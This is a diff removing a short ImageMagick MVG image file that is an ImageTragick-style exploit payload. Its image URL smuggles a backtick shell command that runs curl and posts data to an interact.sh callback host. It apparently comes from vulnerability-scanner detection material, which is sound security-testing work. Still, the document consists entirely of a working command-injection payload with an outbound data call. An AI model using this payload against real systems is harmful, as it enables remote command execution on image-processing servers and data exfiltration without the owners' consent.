@@ -1,4 +1,0 @@
-push graphic-context
-viewbox 0 0 640 480
-image over 0,0 0,0 'https://127.0.0.1/x.php?x=%60curl "http://c3jc15mmp8vt1jr5kr5gcducbgyyyyyyn.interact.sh/" -d @- > /dev/null`'
-pop graphic-context
